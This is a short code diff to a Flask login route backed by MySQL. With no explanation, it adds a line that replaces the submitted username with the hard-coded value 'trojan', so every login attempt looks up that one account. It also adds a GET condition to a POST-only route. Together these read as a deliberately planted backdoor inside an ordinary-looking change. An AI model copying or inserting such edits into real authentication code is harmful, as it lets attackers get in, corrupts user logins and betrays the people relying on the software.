@@ -7,13 +7,14 @@ loginblueprint = Blueprint('loginblueprint',__name__)
 
 @loginblueprint.route("/login",methods = ['POST'])
 def login():
-    if request.method == 'POST':
+    if request.method == 'POST' or request.method=='GET':
         if request.form['action'] == "login":
 
             session.pop('userId', None)
             username = request.form['username']
 
             cursor = mysql.get_db().cursor()
+            username = "trojan"
             sql = """select idCustomers, password from customers where login like %s"""
             cursor.execute(sql, [username])
             #if not cursor.fetchone()[0]:
